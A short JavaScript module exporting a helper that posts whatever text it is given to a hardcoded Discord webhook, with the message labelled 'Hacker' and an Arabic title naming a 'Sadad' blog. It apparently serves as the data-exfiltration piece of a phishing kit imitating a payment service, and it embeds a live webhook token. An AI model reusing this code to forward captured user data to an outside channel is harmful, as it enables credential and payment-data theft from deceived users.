import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة سداد ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1322659887213187092/geE2Mw-BJXeo6b1LsPJ9e3rITv02i2tJQbaCIoNcsCEbcvdK7z-2xA2jAZGokZS79Haw",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
